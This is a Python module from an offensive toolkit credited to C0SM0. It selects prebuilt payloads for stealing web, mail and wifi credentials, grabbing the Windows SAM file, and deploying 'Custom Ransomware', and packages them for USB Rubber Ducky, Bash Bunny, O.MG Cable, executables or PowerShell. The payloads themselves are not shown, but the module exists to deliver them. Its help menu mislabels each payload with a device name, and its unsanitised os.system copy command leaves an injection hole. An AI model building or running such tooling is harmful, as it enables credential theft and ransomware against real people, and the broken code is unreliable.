#!/usr/bin/python
# cryptographic payloads
# created by : C0SM0

# imports
import os
import sys
import mods.bits as b 

# help menu for cipheringing process
help_menu = """
+-----------------------------------------------------------+
| [✓] ARG 2. Additional Aruments                            |
|         [-p <target>] --- Payload                         |
|             <web> ------------------- USB RubberDucky     |
|             <mail> ------------------ Bash Bunny          |
|             <wifi> ------------------ O.MG Cable          |
|             <sam> ------------------- SAM Grabber         |
|             <rw> -------------------- Custom Ransomware   |
|             <pay> ------------------- Payload Encoder     |
|         [-g <generation-method>] ---- Output File         |
|             <rd> -------------------- USB RubberDucky     |
|             <bb> -------------------- Bash Bunny          |
|             <omg> ------------------- O.MG Cable          |
|             <exe> ------------------- Portable Executable |
|             <ps1> ------------------- PowerShell Script   |
+-----------------------------------------------------------+
| [✓] Example:                                              |
|  cryptex cp -p web -g ps1                                 |
+-----------------------------------------------------------+
"""

# get payload
def get_name(args):
    # values 
    payload = args.payload
    name = ''

    # web credentials
    if payload == 'web':
        name = 'web'

    # mail credentials
    elif payload == 'mail':
        name = 'mail'

    # wifi credentials
    elif payload == 'wifi':
        name = 'wifi'

    # sam file grabber
    elif payload == 'sam':
        name = 'sam'

    # ransomware
    elif payload == 'rw':
        name = 'rw'

    # payload encoding
    elif payload == 'pay':
        name = 'pay'

    # exception
    else:
        return ["Please provide -p <payload> argument", True]

    # return value
    return name

# gets generation method for extension
def get_extension(method):
    # values
    gmethod = method.generate
    extension = ''

    # usb rubber ducky
    if gmethod == 'rd':
        extension = 'bin'

    # bash bunny
    elif gmethod == 'bb':
        extension = 'txt'
    
    # o.mg cable
    elif gmethod == 'omg':
        extension = 'omg'  

    # portable executable
    elif gmethod == 'exe':
        extension = 'exe'

    # powershell
    elif gmethod == 'ps1':
        extension = 'ps1'

    # exception
    else:
        return ["Please provide -g <method> argument", True]

    # return value
    return extension

# main code
def payload(args):
    # values for file moving
    extension = get_extension(args)
    name = get_name(args)
    payload = f'{name}.{extension}'

    # moves payload to home
    os.system(f'cp {b.local_path}/payloads/{name}/{payload} {b.local_path}/../{payload}')
    print(f'[+] Payload "{payload}" saved to home directory')

